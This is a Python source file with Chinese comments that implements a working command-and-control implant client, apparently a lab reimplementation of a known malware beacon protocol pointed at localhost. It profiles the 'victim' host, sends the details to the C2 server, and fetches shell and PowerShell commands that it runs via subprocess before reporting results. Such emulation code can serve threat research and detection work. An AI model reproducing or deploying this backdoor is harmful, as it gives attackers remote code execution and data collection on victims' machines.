import hashlib
import random
import base64
import requests
import subprocess
import json
import platform
import socket
import time
import psutil
from flask import request, jsonify
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# 固定前綴和狀態標識
PREFIXES = {
    'init': 'SIGNBTLG',  # Initial connection
    'key_update': 'SIGNBTKE',  # Key update and profiling request
    'command_request': 'SIGNBTGC',  # Ask for commands
    'operation_failed': 'SIGNBTFI',  # Operation failed
    'operation_success': 'SIGNBTSR'  # Operation success
}

# 定義 XOR 操作
def xor_data(data: bytes, key: bytes):
    return bytes([b1 ^ b2 for b1, b2 in zip(data, key)])

# 獲取主機名稱並生成部分 MD5 hash
def get_md5_of_hostname():
    hostname = socket.gethostname()
    md5_hash = hashlib.md5(hostname.encode()).digest()
    return md5_hash[:8]

# 隨機生成 8 bytes 的識別碼
def generate_random_id():
    return random.randbytes(8)

# 構建 24 bytes 資訊
def construct_message(prefix: str):
    prefix_bytes = prefix.encode('utf-8')  # 固定前綴
    md5_hash_part = get_md5_of_hostname()  # 主機名稱的 MD5 前 8 bytes
    random_id = generate_random_id()  # 隨機生成的識別碼
    message = prefix_bytes + md5_hash_part + random_id
    return message

# 與 C2 伺服器進行通訊
def communicate_with_c2(c2_url, prefix):
    # 構建訊息
    message = construct_message(prefix)

    # 隨機生成 24 bytes 的 key
    key = generate_random_id()

    # 使用 XOR 加密訊息
    # xor_encrypted_message = xor_data(message, key)

    # 將加密後的訊息與 key 拼接並進行 base64 編碼
    # data_to_send = base64.b64encode(xor_encrypted_message + key).decode('utf-8')
    data_to_send = base64.b64encode(message).decode('utf-8')

    # 增加 3~7 個隨機參數
    random_params = '|'.join([str(random.randint(1000, 9999)) for _ in range(random.randint(3, 7))])

    # 將 base64 編碼後的資料與隨機參數結合
    payload = f"{data_to_send}|{random_params}"

    # 發送 POST 請求到 C2 Server 的 /receive_data 路徑
    try:
        response = requests.post(f'{c2_url}/receive_data', data=payload)
        if response.status_code == 200:
            print(f"Server response: {response.json()['status']}")
            return response.json()
        else:
            print(f"Server returned error: {response.status_code}")
            return response.json()
    except Exception as e:
        print(f"Error connecting to C2: {str(e)}")

# 獲取 victim 的基本資訊
def getinfo():
    victim_info = {
        "computer_name": socket.gethostname(),
        "product_name": platform.node(),
        "os_details": platform.platform(),
        "system_uptime": time.time() - psutil.boot_time(),
        "cpu_info": platform.processor(),
        "system_locale": "zh-TW",
        "timezone": time.tzname,
        "network_status": "Connected",
    }
    return victim_info

# 發送 victim 資訊到 C2 server
def send_victim_info(c2_url, info):
    response = requests.post(f'{c2_url}/send_info', json=info)
    return response.json()


# IV_LENGTH = 16  # 初始化向量長度固定為 16 bytes
# def decrypt_data(encrypted_data, aes_key, iv):
#     # base64 解碼，轉換為 bytes
#     encrypted_data_bytes = base64.b64decode(encrypted_data)

#     # 提取初始化向量 (IV)，IV 是加密資料的前 16 個 bytes
#     # iv = encrypted_data_bytes[:IV_LENGTH]
    
#     # 提取加密內容，IV 後面部分是加密的實際數據
#     encrypted_content = encrypted_data_bytes[IV_LENGTH:]
    
#     # 使用 AES.MODE_CBC 初始化解密器
#     cipher = AES.new(aes_key, AES.MODE_CBC, iv)

#     # 解密資料
#     decrypted_data_bytes = cipher.decrypt(encrypted_content)

#     # 去除填充（假設使用的是 PKCS7 填充）
#     decrypted_data = unpad_pkcs7(decrypted_data_bytes)
    
#     return decrypted_data.decode('utf-8')

# # 去除 PKCS7 填充
# def unpad_pkcs7(data):
#     padding_len = data[-1]  # 最後一個字節表示填充的長度
#     return data[:-padding_len]

def decrypt_data(encrypted_data, aes_key):
    # base64 解碼
    encrypted_data_bytes = base64.b64decode(encrypted_data)
    aes_key_bytes = base64.b64decode(aes_key)
    
    # 提取 IV（前 16 bytes）和加密內容（剩下的部分）
    iv = encrypted_data_bytes[:AES.block_size]
    ciphertext = encrypted_data_bytes[AES.block_size:]
    # print(f"iv:{iv}, ciphertext:{ciphertext}")
    
    # 創建 AES CBC 解密器
    decipher = AES.new(aes_key_bytes, AES.MODE_CBC, iv)
    # print("Decipher:", decipher)

    # 解密並移除填充
    plaintext = unpad(decipher.decrypt(ciphertext), AES.block_size)
    # print("Plaintext:", plaintext)

    return plaintext.decode('utf-8')

# def get_command_from_c2(c2_url):
#     response = requests.post(f'{c2_url}/get_command')
#     if response.status_code == 200:
#         encrypted_command = response.json()['command']
#         return encrypted_command
#     else:
#         return None

def get_and_execute_command_from_c2(c2_url):
    try:
        # 向 C2 server 發送請求以獲取指令
        response = requests.post(f'{c2_url}/get_command')
        
        if response.status_code == 200:
            command_data = response.json()
            
            # 獲取到的指令 (可以是shell command 或 PowerShell script)
            command = command_data.get("command", "")
            command_type = command_data.get("type", "powershell")  # 預設為powershell

            if command:
                # 判斷指令類型
                if command_type == "shell":
                    print(f"Executing shell command: {command}")
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    print("Command Output:", result.stdout)

                elif command_type == "powershell":
                    print(f"Executing PowerShell script: {command}")
                    out = execute_powershell_script(command)
                    return out
                else:
                    print("Unknown command type received.")
            else:
                print("No command received.")
                return None
        else:
            print(f"Failed to fetch command. Status code: {response.status_code}")
    
    except Exception as e:
        print(f"Error occurred: {str(e)}")

def execute_powershell_script(script):
    # 呼叫 PowerShell 並執行腳本
    process = subprocess.Popen(["powershell", "-Command", script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="big5")
    out, err = process.communicate()
    return out
    
    # if out:
    #     print(f"PowerShell Output: {out.decode()}")
    # if err:
    #     print(f"PowerShell Error: {err.decode()}")

def send_success_report(c2_url):
    response = requests.post(f'{c2_url}/report_success', json={"status": "OK"})
    if response.status_code == 200:
        print("Success reported to C2 server")
    else:
        print("Failed to report success")

def send_failure_report(c2_url, reason):
    response = requests.post(f'{c2_url}/report_failure', json={"status": "FAILED", "reason": reason})
    if response.status_code == 200:
        print("Failure reported to C2 server")
    else:
        print("Failed to report failure")

# 主循環，不斷傳送訊息到 C2 伺服器
def main():
    c2_url = "http://localhost:5000"  # C2 server 的 URL
    
    # 與 C2 伺服器溝通
    while True:
        # Step 1: 發送初始連接請求
        print("Sending initial connection message...")
        response = communicate_with_c2(c2_url, PREFIXES['init'])
        
        # time.sleep(5)  # 每 5 秒傳送一次

        if response['message'] == 'success':
            aes_key = response['aes_key']
            print("Connection successful, received AES key.")
            print("AES key:", aes_key)
            # print(type(aes_key))
            # iv = response['iv']

            # Step 2: 發送更新金鑰的請求
            response2 = communicate_with_c2(c2_url, PREFIXES['key_update'])
            if response2['message'] == 'success':
                print("Key updated, proceeding to get victim info.")
            
                # Step 3: 獲取 victim 基本資訊並發送
                info = getinfo()
                # print("victim info:", info)
                send_info_response = send_victim_info(c2_url, info)
                if send_info_response['message'] == 'success':
                    print(send_info_response['status'])


                time.sleep(5)
                response3 = communicate_with_c2(c2_url, PREFIXES['command_request'])
                if response3['message'] == 'keep':
                    # 步驟1: 向 C2 server 要求命令
                    # encrypted_command = str.encode(get_command_from_c2(c2_url))
                    output = get_and_execute_command_from_c2(c2_url)
                    if output is None:
                        print("Failed to get or execute command from C2 server")
                        return
                    else:
                        print(f"Output after execution: {output}")
                        # print(type(encrypted_command))
                        
                    # 步驟2: 解密命令
                    try:
                        # decrypted_command = decrypt_data(encrypted_command, aes_key)
                        # print(f"Decrypted Command: {decrypted_command}")
                        # 模擬執行命令
                        # print("Executing command...")
                        # 告訴C2命令執行成功
                        send_success_report(c2_url)
                    except Exception as e:
                        print(f"Error executing command: {str(e)}")
                        send_failure_report(c2_url, "Execution failed")
                        return

            else:
                print("Key update failed.")
        
        else:
            print("Initial connection failed.")

        time.sleep(10)

if __name__ == '__main__':
    main()
